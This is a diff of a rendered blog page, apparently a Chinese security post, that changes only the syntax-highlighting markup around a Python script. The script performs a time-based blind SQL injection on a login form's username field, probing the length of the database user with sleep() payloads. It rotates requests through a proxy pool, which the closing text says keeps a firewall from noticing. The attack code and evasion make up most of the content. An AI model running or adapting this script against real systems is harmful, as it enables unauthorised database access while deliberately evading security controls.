@@ -81,7 +81,7 @@
 42
 43
 44
-45</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+45</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
 <span class="c1"># coding: utf-8</span>
 
 <span class="kn">import</span> <span class="nn">requests</span>
@@ -98,7 +98,7 @@
 
 <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">28</span><span class="p">):</span>
     <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;PHPSESSID&quot;</span><span class="p">:</span> <span class="s2">&quot;f4udpabdluoed7ldhfp90&quot;</span><span class="p">}</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;1&#39; or select if(length(user())={},sleep(15),1) or &#39;1&#39;=&#39;1&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;1&#39; or select if(length(user())=</span><span class="si">{}</span><span class="s2">,sleep(15),1) or &#39;1&#39;=&#39;1&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
     <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span> <span class="s2">&quot;userpwd&quot;</span><span class="p">:</span> <span class="s2">&quot;abc&quot;</span><span class="p">}</span>
 
     <span class="k">def</span> <span class="nf">val</span><span class="p">():</span>
@@ -119,14 +119,14 @@
         <span class="k">try</span><span class="p">:</span>
             <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;http&quot;</span><span class="p">:</span> <span class="n">proxy</span><span class="p">},</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">200</span><span class="p">)</span>
             <span class="k">if</span> <span class="n">req</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
-                <span class="k">print</span> <span class="s2">&quot;[*]i:</span><span class="si">%s</span><span class="s2">, before:</span><span class="si">%s</span><span class="s2">, now:</span><span class="si">%s</span><span class="s2">, Cost:</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">now</span><span class="p">,</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">(),</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span><span class="o">-</span><span class="n">now</span><span class="p">)</span>
-                <span class="k">print</span> <span class="s2">&quot;[*]proxy:</span><span class="si">%s</span><span class="s2">, Content:</span><span class="si">%s</span><span class="s2">, Testtime:</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">proxy</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">content</span><span class="p">),</span> <span class="n">testtime</span><span class="p">)</span>
-                <span class="k">print</span> <span class="s2">&quot;[*]TimeCompare: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">((</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span><span class="o">-</span><span class="n">now</span><span class="p">)</span> <span class="o">-</span> <span class="n">testtime</span><span class="p">)</span>
-                <span class="k">print</span> <span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">30</span>
+                <span class="nb">print</span> <span class="s2">&quot;[*]i:</span><span class="si">%s</span><span class="s2">, before:</span><span class="si">%s</span><span class="s2">, now:</span><span class="si">%s</span><span class="s2">, Cost:</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">now</span><span class="p">,</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">(),</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span><span class="o">-</span><span class="n">now</span><span class="p">)</span>
+                <span class="nb">print</span> <span class="s2">&quot;[*]proxy:</span><span class="si">%s</span><span class="s2">, Content:</span><span class="si">%s</span><span class="s2">, Testtime:</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">proxy</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">content</span><span class="p">),</span> <span class="n">testtime</span><span class="p">)</span>
+                <span class="nb">print</span> <span class="s2">&quot;[*]TimeCompare: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">((</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span><span class="o">-</span><span class="n">now</span><span class="p">)</span> <span class="o">-</span> <span class="n">testtime</span><span class="p">)</span>
+                <span class="nb">print</span> <span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">30</span>
                 <span class="k">break</span>
         <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
             <span class="k">pass</span>
-</pre></div>
+</code></pre></div>
 </td></tr></table>
 
 <p>开个proxypool.py，然后<code>http://127.0.0.1:1111/time&lt;4</code>找个稍微好点的代理，就这样循环下去吧，这样每次请求目标之后，都会切换到下个代理。所以就不会触发防火墙啦，具体效果再说。</p>
